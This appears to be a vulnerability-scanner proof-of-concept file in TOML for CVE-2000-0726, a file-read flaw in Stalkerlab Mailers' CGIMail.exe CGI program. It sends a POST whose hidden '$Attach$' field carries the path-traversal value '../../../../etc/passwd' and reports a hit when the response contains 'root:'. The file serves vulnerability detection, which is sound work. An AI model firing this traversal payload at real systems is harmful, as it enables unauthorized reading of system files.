[info]
author = "ave"
description = "验证 Stalkerlab Mailers 1.1.2 CGIMail.exe CGI 程序的 $Attach$ 隐藏表单变量任意文件读取漏洞"
id = "POC-AVE-2000-00878"
name = "CVE-2000-0726 PoC"
severity = "low"
tags = ["ave-2000-0878"]
vuln_id = [
    "CVE-2000-0726",
    "AVE-2000-0878",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/CGIMail.exe"
protocol = "http"

[poc.requests.body]
type = "form"

[poc.requests.body.content]
"$Attach$" = "../../../../etc/passwd"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
